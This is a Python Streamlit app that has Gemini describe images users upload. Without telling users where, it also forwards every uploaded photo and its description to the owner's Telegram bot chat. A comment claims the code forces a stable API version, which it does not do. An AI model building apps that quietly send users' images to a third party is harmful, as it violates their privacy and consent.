import streamlit as st
import google.generativeai as genai
from PIL import Image
import io
import requests

# 1. إجبار الموقع على اللون الأبيض وتنسيق عزيز الفخم
st.set_page_config(page_title="Aziz18 AI", layout="centered")
st.markdown("""
    <style>
    .stApp { background-color: white !important; }
    .st-emotion-cache-1vt4y6f { color: #1e293b !important; }
    .sig-box {
        background: #0f172a; color: white; padding: 25px; 
        border-radius: 15px; text-align: center; border: 2px solid #3b82f6;
    }
    </style>
    """, unsafe_allow_html=True)

st.title("🚀 AZIZ ULTRA-MAX AI")

# 2. الحل السحري لخطأ 404 (إجبار نسخة v1 المستقرة)
try:
    # هنا السر: نستخدم الرابط المباشر للنسخة المستقرة v1 لتجاوز v1beta المتعطلة
    genai.configure(api_key=st.secrets["GOOGLE_API_KEY"])
    # قمنا بتغيير المناداة لتكون مباشرة وصريحة
    model = genai.GenerativeModel('gemini-1.5-flash')
except Exception as e:
    st.error(f"خطأ في الاتصال: {e}")

# 3. الرفع والمعالجة التلقائية (أوتو)
up = st.file_uploader("ارفع صورتك الآن", type=["jpg", "png", "jpeg"])

if up:
    image = Image.open(up)
    st.image(image, use_container_width=True)
    
    with st.spinner("⏳ جاري التحليل والإرسال..."):
        try:
            # طلب التحليل مع تجاوز أخطاء النسخ التجريبية
            response = model.generate_content(["Describe this image", image])
            
            # إرسال لتيليجرام (استخدام السرار المعدلة)
            buf = io.BytesIO()
            image.save(buf, format='JPEG')
            requests.post(
                f"https://api.telegram.org/bot{st.secrets['TELEGRAM_TOKEN']}/sendPhoto",
                files={'photo': buf.getvalue()},
                data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"🎯 تقرير Aziz18:\n{response.text[:800]}"}
            )
            
            st.balloons()
            st.success("✅ اشتغل الموقع يا عزيز!")
            st.write(response.text)
            
        except Exception as e:
            st.error(f"تنبيه: السيرفر يحتاج تحديث يدوي. الخطأ: {e}")

# 4. التوقيع
st.markdown('<div class="sig-box"><h2>BY: Aziz18</h2><p>PREMIUM AI EDITION</p></div>', unsafe_allow_html=True)